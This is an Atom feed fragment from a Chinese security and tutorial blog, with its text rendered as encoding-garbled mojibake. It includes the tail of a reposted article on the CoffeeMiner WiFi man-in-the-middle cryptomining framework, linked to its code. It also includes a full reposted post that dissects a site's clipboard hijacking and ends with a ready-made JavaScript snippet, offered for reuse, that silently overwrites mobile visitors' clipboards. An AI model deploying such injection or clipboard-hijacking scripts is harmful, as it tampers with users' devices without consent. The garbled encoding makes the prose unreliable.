title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦‚ä¸Šæ‰€ç¤ºï¼Œé»‘å®¢å¯ä»¥éå¸¸å®¹æ˜“åœ°åœ¨æŸä¸ªWIFIç¯å¢ƒä¸­å‘èµ·éšè”½æ¶æ„è¡Œä¸ºï¼Œå¯¹æ¥å…¥ç½‘ç»œçš„å¤§é‡ç”µå­è®¾å¤‡è¿›è¡ŒæŒæ§å¹¶åˆ©ç”¨å…¶å¼€å±•â€œæŒ–çŸ¿â€æ´»åŠ¨ã€‚é€šå¸¸ï¼Œä¸€äº›å…·å¤‡å¼ºåŠ›ä¿¡å·çš„WIFIç½‘ç»œå¯èƒ½ä¼šè¢«é»‘å®¢åˆ©ç”¨ï¼Œå¦å¤–ï¼Œé»‘å®¢å¯èƒ½è¿˜ä¼šåœ¨ç¨‹åºä¸­åŠ å…¥Nmapæ‰«æå’ŒsslstripåŠŸèƒ½ã€‚CoffeeMinerå®Œæ•´ä»£ç è¯·è®¿é—® <a href="https://github.com/arnaucode/coffeeMiner">https://github.com/arnaucode/coffeeMiner</a></p><blockquote><p>è½¬è½½è‡ªFreeBuf.COM <a href="http://www.freebuf.com/articles/wireless/159688.html">http://www.freebuf.com/articles/wireless/159688.html</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;å‡ ä¸ªæ˜ŸæœŸä»¥å‰ï¼Œæˆ‘çœ‹åˆ°äº†ç½‘ä¸Šå…³äºé»‘å®¢åŠ«æŒæ˜Ÿå·´å…‹WiFiç½‘ç»œä¸­çš„ç¬”è®°æœ¬ç”µè„‘è¿›è¡Œâ€œæŒ–çŸ¿â€çš„æŠ¥é“ï¼Œéå¸¸æœ‰æ„æ€ï¼Œç»“åˆåˆ†æï¼Œæˆ‘è®¤ä¸ºï¼Œè¿˜èƒ½ç”¨ä¸­é—´äººMITMæµ‹è¯•æ–¹å¼æ¥å®ç°ç±»ä¼¼ç›®çš„ã€‚æœ¬æ–‡ä¸­æˆ‘ä»¬å°±æ¥è®¨è®ºï¼Œå¦‚ä½•ä»¥MITMæ–¹å¼åœ¨htmlé¡µé¢ä¸­æ³¨å…¥javascriptï¼Œè®©é‚£äº›æ¥å…¥å…¬å…±WIFIçš„ç”µå­è®¾å¤‡æˆä¸ºé»‘å®¢æ‰‹ä¸­çš„â€œæŒ–çŸ¿â€çŸ¿å·¥ã€‚æœ€ç»ˆæˆ‘ä¼šç¼–å†™ä¸€ä¸ªå®é™…çš„è¢«ç§°ä¸ºâ€œCoffeeMinerâ€çš„è„šæœ¬ï¼Œå¯ä»¥ç”¨å®ƒæ¥åœ¨å’–å•¡åº—ç­‰å…¬å¼€WIFIç½‘ç»œç¯å¢ƒä¸­è¿›è¡ŒåŒ¿åæ¸—é€ï¼Œå®ç°æŒæ§å¤§é‡ç”µå­è®¾å¤‡å¼€å±•â€œæŒ–çŸ¿â€ç›®çš„ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æµ‹è¯•åœºæ™¯&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¦åœ¨åœ¨ä¸€ä¸ªå…¬å¼€çš„WIFIç½‘ç»œç¯å¢ƒä¸­å®ç°è¯¥ç§ç›®çš„ï¼ŒCoffeeMineræµ‹è¯•è€…è¦è¯•å›¾æ‹¦æˆªç”¨æˆ·å’Œè·¯ç”±å™¨ä¹‹é—´çš„æµé‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š&lt;br&gt;&lt;img src=&quot;/pictures/CoffeeMiner/1.png&quot;&gt;&lt;br&gt;&lt;strong&gt;CoffeeMinerï¼šåŠ«æŒWiFiç½‘ç»œæ¥å…¥è®¾å¤‡è¿›è¡Œâ€œæŒ–çŸ¿â€çš„æ¶æ„æ¡†æ¶&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://thinkalone.win/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://thinkalone.win/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºå¥¸ä½ çš„å‰ªåˆ‡æ¿</title>
    <link href="https://thinkalone.win/Clipboard.html"/>
    <id>https://thinkalone.win/Clipboard.html</id>
    <published>2018-01-27T07:43:35.000Z</published>
    <updated>2018-01-27T07:43:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å› ä¸ºç§ç§åŸå› ï¼Œç»å¸¸æœ‰ç½‘é¡µå¼ºå¥¸ä½ çš„æ‰‹æœºå‰ªåˆ‡æ¿ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ¢ç©¶ä¸€ä¸‹ï¼Œè¿™äº›ç½‘é¡µç©¶ç«Ÿæ˜¯æ€ä¹ˆå¼ºå¥¸ä½ çš„å‰ªåˆ‡æ¿çš„ã€‚</p><span id="more"></span><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>äº‹æƒ…çš„èµ·å› å…¶å®å¾ˆå¥‡æ€ªï¼Œæˆ‘æ˜¨å¤©æ™šä¸Šå»æŸ¥èµ„æ–™çš„æ—¶å€™ï¼Œæ— æ„ä¸­å‘ç°æˆ‘çš„å‰ªåˆ‡æ¿è¢«å¼ºå¥¸çš„ï¼Œæ‰€ä»¥å°±ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹è¿™ä¸ªä¸œè¥¿ã€‚</p><p>æœ¬æ¥æˆ‘å¯¹JSä¹Ÿæ˜¯ä¸€çªä¸é€šï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡å†™JSè„šæœ¬ï¼Œä¸Šä¸€æ¬¡æ˜¯å†™é‚£ä¸ªè·³è½¬é¡µé¢ã€‚å¦‚æœæœ¬æ–‡æœ‰ä»€ä¹ˆé”™è¯¯ï¼Œæ¬¢è¿å¤§ä½¬æŒ‡æ­£ã€‚</p><p>å…ˆè¯´ä¸€ä¸‹æˆ‘è®¿é—®çš„ç½‘é¡µï¼Œèœé¸Ÿæ•™ç¨‹æ‰‹æœºç‰ˆ<a href="https://m.runoob.com/">https://m.runoob.com/</a></p><p>å‘ç°å‰ªåˆ‡æ¿è¢«å¼ºå¥¸ä¹‹åï¼Œæˆ‘å°±å»ä¸‹è½½äº†ä¸€ä¸ªå‰ªåˆ‡æ¿ç›‘æ§æ’ä»¶<a href="https://www.coolapk.com/apk/com.chili.ClipboardManager">https://www.coolapk.com/apk/com.chili.ClipboardManager </a></p><p>ç„¶åæ‰¾åˆ°äº†ä¸€ç‚¹çº¿ç´¢<br><img src="/pictures/Clipboard/1.png"></p><p><img src="/pictures/Clipboard/2.png"></p><p>è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼Œæ˜¾ç¤ºçš„æ“ä½œåº”ç”¨æ—¶ç³»ç»Ÿwebå†…æ ¸ï¼Œå…¶å®æ—¶viaè°ƒç”¨äº†ç³»ç»Ÿwebå†…æ ¸ï¼Œè€Œè¿™ä¸ªå¤åˆ¶æ“ä½œåˆæ˜¯åœ¨viaæµè§ˆå™¨ä¸­æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä¼šæç¤ºwebå†…æ ¸è®¿é—®äº†å‰ªåˆ‡æ¿ã€‚</p><h2 id="åŸç†è§£æ"><a href="#åŸç†è§£æ" class="headerlink" title="åŸç†è§£æ"></a>åŸç†è§£æ</h2><p>å¥½äº†ï¼Œå…ƒå‡¶æ‰¾åˆ°äº†ï¼Œæˆ‘ä»¬å°±è¦çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆä½œæ¡ˆçš„ï¼Œæ‰‹æœºæµè§ˆå™¨è°ƒè¯•ä¸å¤ªæ–¹ä¾¿ï¼Œæˆ‘å°±ç­‰åˆ°ç¬¬äºŒå¤©åˆ°ç”µè„‘ä¸Šæ¥çœ‹çœ‹ã€‚</p><p>é¦–å…ˆæ‰“å¼€ç½‘é¡µï¼Œç„¶åæ‰“å¼€è°ƒè¯•å·¥å…·ï¼Œç„¶åé‡æ–°åˆ·æ–°ä¸€ä¸‹ç½‘é¡µçœ‹çœ‹ã€‚</p><p>çœ‹çœ‹æˆ‘æ‰¾åˆ°äº†ä»€ä¹ˆï¼Œæœç„¶æ˜¯é€šè¿‡JSå®ç°çš„<br><img src="/pictures/Clipboard/3.png"><br>è¿™ä¸ªclipboard.min.jså°±æ˜¯ç”¨äºå®ç°å¤åˆ¶æ–‡æœ¬åˆ°å‰ªåˆ‡æ¿çš„ï¼Œè€Œä¸”å…¼å®¹æ€§éå¸¸å¥½ã€‚</p><p>å¥½äº†ï¼Œæ—¢ç„¶çŸ¥é“æ˜¯æ€ä¹ˆä½œæ¡ˆçš„ï¼Œé‚£å°±å†å¾€æ·±äº†æŸ¥ä¸€ç‚¹ï¼Œå’±ä»¬çœ‹çœ‹index.htmlé‡Œéƒ½å†™äº†ä»€ä¹ˆã€‚</p><p>å…ˆæŠŠç½‘é¡µå¤åˆ¶å‡ºæ¥ï¼Œç„¶åæœç´¢<code>clipboard</code>ï¼Œæ‰¾åˆ°ç›¸å…³çš„çº¿ç´¢ã€‚<br><img src="/pictures/Clipboard/4.png"><br>ç®€å•è§£é‡Šä¸€ä¸‹ï¼Œä»–å…ˆé€šè¿‡<a href="https://m.runoob.com/api/codexx.php">https://m.runoob.com/api/codexx.php</a> è¿™ä¸ªæ¥å£è·å–æ•°æ®ï¼Œä½ ä»¬æœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘å¾—åˆ°çš„æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;flag&quot;:true,&quot;ins_data&quot;:&quot;\uffe5Sh7p0Osu3GO\uffe5&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ¥ç€å¾€ä¸‹çœ‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ”¹å˜bodyçš„idå’Œdata-clipboard-textï¼Œè¿™ä¸¤æ­¥éƒ½æ˜¯ç»™æ¥ä¸‹æ¥å¼ºå¥¸ä½ çš„å‰ªåˆ‡æ¿åšå‡†å¤‡ï¼Œç„¶åå°±æ˜¯å¼ºå¥¸ä½ å‰ªåˆ‡æ¿çš„æ–¹æ³•å’¯ï¼Œå†åé¢å°±æ˜¯éªŒè¯æœ‰æ²¡æœ‰å¼ºå¥¸æˆåŠŸã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¦åˆ¤æ–­ä½ æ˜¯ä¸æ˜¯ç§»åŠ¨è®¾å¤‡ï¼Œå› ä¸ºå¼ºå¥¸ä½ ç”µè„‘çš„å‰ªåˆ‡æ¿æ˜¯å®Œå…¨æ²¡ç”¨çš„ã€‚</p><h2 id="éªŒè¯ä¸€ä¸‹"><a href="#éªŒè¯ä¸€ä¸‹" class="headerlink" title="éªŒè¯ä¸€ä¸‹"></a>éªŒè¯ä¸€ä¸‹</h2><p>çœ‹åˆ°åˆ«äººå‰§æœ¬å†™çš„æŒºå¥½çš„ï¼Œéš¾å…æƒ³è¦éªŒè¯ä¸€ä¸‹ï¼Œæ‰€ä»¥è‡ªå·±æ”¹äº†ä¸€ä¸ªå‰§æœ¬</p><p><img src="/pictures/Clipboard/5.png"></p><p>ç»“æœï¼š<br><img src="/pictures/Clipboard/6.png"></p><p>å¥½äº†æˆ‘å·²ç»å¯ä»¥æˆåŠŸå¼ºå¥¸å‰ªåˆ‡æ¿äº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;x-ua-compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æµ‹è¯•é¡µé¢<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;copy&quot;</span> <span class="attr">data-clipboard-text</span>=<span class="string">&quot;æµ‹è¯•å‰ªåˆ‡æ¿&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>å‡†å¤‡å¼ºå¥¸</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        ç»“æŸ<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cat.net/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cat.net/ajax/libs/clipboard.js/1.7.1/clipboard.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     $(<span class="string">&quot;body&quot;</span>).<span class="property">onclick</span> = <span class="title function_">copycode</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">copycode</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="regexp">/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>))</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> clipboard = <span class="keyword">new</span> <span class="title class_">Clipboard</span>(<span class="string">&#x27;#copy&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            clipboard.<span class="title function_">on</span>(<span class="string">&#x27;success&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;å¤åˆ¶æˆåŠŸ&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            clipboard.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;å¤åˆ¶å¤±è´¥&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å†™åœ¨åé¢çš„"><a href="#å†™åœ¨åé¢çš„" class="headerlink" title="å†™åœ¨åé¢çš„"></a>å†™åœ¨åé¢çš„</h2><p>å…³äºç½‘é¡µä¸­æ’å…¥å¼ºå¥¸å‰ªåˆ‡æ¿ä»£ç è¿™ä»¶äº‹ï¼Œæˆ‘ä¸åå¯¹ï¼Œä½†æ˜¯æœ€èµ·ç è¦æœ‰ä¸ªè¯´æ˜ä»€ä¹ˆçš„ï¼Œåœ¨æ˜¾çœ¼çš„ä½ç½®è¯´ä¸€ä¸‹ï¼Œæˆ‘åŠ äº†å¼ºå¥¸å‰ªåˆ‡æ¿çš„ä»£ç ã€‚</p><h3 id="é™„æœ¬æ–‡æ‰€ç”¨ä»£ç "><a href="#é™„æœ¬æ–‡æ‰€ç”¨ä»£ç " class="headerlink" title="é™„æœ¬æ–‡æ‰€ç”¨ä»£ç "></a>é™„æœ¬æ–‡æ‰€ç”¨ä»£ç </h3><p>æƒ³ç”¨ç›´æ¥æ‹¿å»ç”¨ï¼Œæˆ‘ä¹Ÿä¸æä»€ä¹ˆåŠ å¯†æ”¶è´¹çš„ï¼Œè¿æˆ‘è¿™ä¸ªå¯¹JSä¸€çªä¸é€šçš„éƒ½èƒ½æ£é¼“å‡ºæ¥ä¸€ä¸ªï¼ŒåŸæœ¬å¾ˆç®€å•çš„ä¸€ä¸ªä¸œè¥¿ï¼Œå´è¦æ‹¿å»æ”¶è´¹ï¼ŒçœŸTMZZã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cat.net/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cat.net/ajax/libs/clipboard.js/1.7.1/clipboard.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">&quot;body&quot;</span>).<span class="property">onclick</span> = <span class="title function_">copycode</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">&quot;body&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;id&quot;</span> ,<span class="string">&quot;copy&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">&quot;body&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;data-clipboard-text&quot;</span> ,<span class="string">&quot;å¼ºå¥¸ä½ çš„å‰ªåˆ‡æ¿ lieetD58G4&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">copycode</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">//if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> clipboard = <span class="keyword">new</span> <span class="title class_">Clipboard</span>(<span class="string">&#x27;#copy&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            clipboard.<span class="title function_">on</span>(<span class="string">&#x27;success&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="comment">//alert(&quot;æˆ‘å¼ºå¥¸äº†ä½ çš„å‰ªåˆ‡æ¿&quot;);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            clipboard.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="comment">//alert(&quot;å¤åˆ¶å¤±è´¥&quot;);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>åŸæ–‡è¿™é‡Œå°±æ˜¯æŠŠä¸Šé¢çš„ä»£ç ç›´æ¥å†™åˆ°mdæ–‡ä»¶é‡Œï¼Œç„¶åï¼ˆè¿™ç¯‡æ–‡ç« æ²¡æœ‰ï¼Œå·²ç»è¢«æˆ‘å»æ‰äº†ï¼‰ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><blockquote><p>è½¬è½½è‡ª <a href="https://www.xxwhite.com/2018/Clipboard.html">https://www.xxwhite.com/2018/Clipboard.html</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ€è¿‘å› ä¸ºç§ç§åŸå› ï¼Œç»å¸¸æœ‰ç½‘é¡µå¼ºå¥¸ä½ çš„æ‰‹æœºå‰ªåˆ‡æ¿ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ¢ç©¶ä¸€ä¸‹ï¼Œè¿™äº›ç½‘é¡µç©¶ç«Ÿæ˜¯æ€ä¹ˆå¼ºå¥¸ä½ çš„å‰ªåˆ‡æ¿çš„ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://thinkalone.win/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://thinkalone.win/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="å·¥å…·" scheme="https://thinkalone.win/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
